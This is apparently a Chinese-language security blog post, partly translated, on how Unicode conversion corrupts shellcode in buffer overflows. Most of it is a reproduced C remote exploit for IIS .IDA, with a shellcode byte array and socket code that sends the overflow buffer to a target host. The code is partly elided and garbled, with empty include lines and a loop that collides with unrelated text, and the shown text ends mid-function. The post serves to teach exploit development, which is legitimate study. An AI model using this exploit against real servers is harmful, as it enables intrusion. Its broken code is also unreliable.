## 前言
* * *
前些天和朋友在玩War3的时候，登陆了某平台，打开了某平台后里面的中文字符全部变成了？？？，顿时想起我装的的英文版系统，编码出现了问题。回头一想shellcode的内存中是不是也会出现这样的情况。便查了查资料，总结了一下。文章分3部分，前两部分是一篇文章的翻译，之所是翻译我觉得在这方面的知识点，那篇文章已经讲的相对完备了，我觉得没必要画蛇添足又变成自己的“东西”。第3部分是我具体的调试过程。  
（1）（2）部分原文链接：
## Introduction
* * *
在利用缓冲区溢出时，我们有时候得面对一些难题：字符转换。在进行漏洞利用的实际情况中，漏洞程序可能会通过设置大小写、删除非数字或字母的字符等修改我们构造的缓冲区，使我们的shellcode无法正确运行。这篇文章所说的便是C-Type(以0结尾的字符穿)字符串和Unicode的转变问题。
我们来思考一个情况：  
你给一个带漏洞的服务器发送了一些数据，这些数据由ASCII编码，后由于兼容性的原因你的字符被转换为unicode，然后你发送的数据的缓冲区便发生了溢出。
例如，发送了这样一组数据：
    4865 6C6C 6F20 576F 726C 6420 2100 0000 Hello World !...
    0000 0000 0000 0000 0000 0000 0000 0000 ................
然后会转变成：
    4800 6500 6C00 6C00 6F00 2000 5700 6F00 H.e.l.l.o. .W.o.
    7200 6C00 6400 2000 2100 0000 0000 0000 r.l.d. .!.......
然后，bang~~~，产生溢出（Yeah~~~，我知道我的例子很傻）  
在Win32平台下，一个进程通常从00401000开始，这样便有可能使用如下的返回地址破环EIP：
    ????:00??00??
虽然会产生这样的字符转换，但对漏洞利用依然是可能的，但是获得一个可用的shellcode将会困难得多。有一种可能的办法是多次用未经格式化的数据填充堆栈，然后进行缓冲区溢出，并使其返回到相应编码的shellcode中。但是在这里，我们假设所有的缓冲区都是unicode，所以这种办法是不可行的，更不用说我们还不能确定汇编代码会不会顺利执行。所以我们需要找到一种方法来构建一个结局这样的shellcode转型。
我们需要找到包含空字节的操作码来构建我们shellcode。  
这里有一个例子，虽然比较老了，但是它就是一个即使缓冲区被破坏，漏洞利用也可以进行的例子。
    ---------------- CUT HERE -------------------------------------------------    
    /* 
       IIS .IDA remote exploit
       formatted return address : 0x00530053
       IIS sticks our very large buffer at 0x0052....
       We jump to the buffer and get to the point
       by obscurer
    */
    #include 
    #include 
    #include 
    void usage(char *a);
    int wsa();
    /* My Generic Win32 Shellcode */
    unsigned char shellcode[]={
    "\xEB\x68\x4B\x45\x52\x4E\x45\x4C\x13\x12\x20\x67\x4C\x4F\x42\x41"
    "\x4C\x61\x4C\x4C\x4F\x43\x20\x7F\x4C\x43\x52\x45\x41\x54\x20\x7F"
    [......]
    [......]
    [......]
    "\x09\x05\x01\x01\x69\x01\x01\x01\x01\x57\xFE\x96\x11\x05\x01\x01"
    "\x69\x01\x01\x01\x01\xFE\x96\x15\x05\x01\x01\x90\x90\x90\x90\x00"};
    int main (int argc, char **argv)
    {
    int sock;
    struct hostent *host;
    struct sockaddr_in sin;
    int index;
    char *xploit;
    char *longshell;
    char retstring[250];
    if(argc!=4&&argc!=5) usage(argv[0]);
    if(wsa()==FALSE)
    {
        printf("Error : cannot initialize winsock\n");
        exit(0);
    }
    int size=0;
    if(argc==5)
    size=atoi(argv[4]);
    printf("Beginning Exploit building\n");
    xploit=(char *)malloc(40000+size);
    longshell=(char *)malloc(35000+size);
    if(!xploit||!longshell) 
    {
    printf("Error, not enough memory to build exploit\n");
    return 0;
    }
    if(strlen(argv[3])>65)
    {
    printf("Error, URL too long to fit in the buffer\n");
    return 0;
    }
    for(index=0;indexh_addr,
           sizeof(host->h_addr));
    }
    else sin.sin_addr.S_un.S_addr=inet_addr(argv[1]);
    sin.sin_family=AF_INET;
    sin.sin_port=htons(atoi(argv[2]));
    index=connect(sock,(struct sockaddr *)&sin,sizeof(sin));
    if (index==-1)
    {
        printf("Error : Couldn't connect to host\n");
        return 0;
    }
    printf("Connected to host, sending shellcode\n");
    index=send(sock,xploit,strlen(xploit),0);
    if(index<1)
    {
        printf("Error : Couldn't send trough socket\n");
        return 0;
    }
    printf("Done, waiting for an answer\n");
    memset (xploit,0, 2000);
    index=recv(sock,xploit,100,0);
    if(index<0)
    {
        printf("Server crashed, if exploit didn't work,
                    increase buffer size by 10000\n");
        exit(0);
    }